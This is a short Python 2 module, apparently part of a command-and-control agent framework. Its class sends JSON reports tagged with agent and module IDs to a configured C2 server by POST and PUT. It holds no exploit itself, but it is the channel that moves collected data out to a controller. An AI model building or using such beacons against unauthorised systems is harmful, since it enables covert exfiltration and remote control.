from urllib3 import PoolManager
import settings
import json


class Rester(object):

    def __init__(self):
        self.url = settings.C2_URL
        print self.url
        self.module_id = settings.MODULE_ID
        self.agent_id = settings.AGENT_ID
        self.http = PoolManager()

    def post(self, table, data):
        uri = "/api/report/"
        method = "POST"

        params = {
            'agent_id': self.agent_id,
            'module_id': self.module_id,
            'table': table,
            'data': data
        }
        params = json.dumps(params)

        self.http.request(method, self.url+uri, headers={'Content-Type': 'application/json'}, body=params)

    def update(self, table, data):
        uri = "/api/report/"
        method = "PUT"
        data = json.dumps(data)
        params = {
            'agent': self.agent_id,
            'module': self.module_id,
            'table': table,
            'data': data
        }
        self.http.request(method, self.url+uri, params)


